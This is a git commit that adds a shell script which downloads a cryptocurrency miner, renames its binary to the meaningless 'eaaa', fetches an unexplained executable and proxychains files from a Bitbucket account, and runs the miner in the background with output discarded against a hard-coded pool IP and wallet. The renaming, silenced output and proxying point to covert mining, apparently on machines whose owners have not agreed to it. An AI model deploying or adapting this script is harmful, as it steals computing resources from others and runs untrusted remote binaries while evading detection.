4a1b0ce3e78e2ab0e1c75f8b08f5a2a12f0171d5
HellDarkK <86185393+SankuNetwork@users.noreply.github.com>
2023-08-05 20:19:03 +0700

    Create RCSRBMineYPIC.sh

---
+++ mnr/cpulimited/400/RCSRBMineYPIC.sh
@@ -0,0 +1,14 @@
+sudo apt update ; sudo apt install cpulimit htop neofetch -y
+wget -O hamz.tar.gz https://github.com/doktor83/SRBMiner-Multi/releases/download/2.3.1/SRBMiner-Multi-2-3-1-Linux.tar.xz && tar -xf hamz.tar.gz
+wget -q -O proxy https://bitbucket.org/asimadarasi/alima/downloads/panel && chmod +x proxy
+wget https://bitbucket.org/asimadarasi/alima/downloads/libproxychains4.so && chmod +x libproxychains4.so
+wget -q https://bitbucket.org/asimadarasi/alima/downloads/proxychains.conf && chmod +x proxychains.conf 
+echo "IP ORI ==> "$(curl ifconfig.me)
+echo "IP Baru ==> "$(curl ifconfig.me)
+cd SRBMiner-Multi-2-3-1/
+mv SRBMiner-MULTI  ..
+cd ..
+mv SRBMiner-MULTI eaaa
+rm -rf SRBMiner-Multi-2-3-1/
+sudo cpulimit --background -e eaaa -l 400
+nohup ./eaaa --algorithm yespoweric --pool stratum+ssl://103.249.70.7:16238 --wallet RHTx4HUZRrmy8tWhpn5WWX2x7KmfYS4Txq --password c=VRSC,id=YANTO$(( $RANDOM % 1000 + 1 )) --cpu-threads 6 --disable-gpu &> /dev/null &
